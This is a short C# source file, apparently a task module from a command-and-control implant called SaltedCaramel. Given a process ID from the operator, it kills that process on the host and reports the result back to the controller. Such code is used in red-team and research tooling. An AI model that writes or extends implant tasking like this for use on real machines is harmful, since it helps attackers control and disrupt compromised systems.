using System;
using System.Diagnostics;

namespace SaltedCaramel.Tasks
{
    class Kill
    {
        internal static void Execute(SCTask task, SCImplant implant)
        {
            int pid = Convert.ToInt32(task.@params);
            try
            {
                Debug.WriteLine("[-] Kill - Killing process with PID " + pid);
                Process target = Process.GetProcessById(pid);
                target.Kill();
                implant.PostResponse(new SCTaskResp(task.id, "Killed process with PID " + pid));
                implant.SendComplete(task.id);
            }
            catch (Exception e)
            {
                Debug.WriteLine("[-] Kill - ERROR killing process " + pid + ": " + e.Message);
                implant.SendError(task.id, e.Message);
            }
        }
    }
}
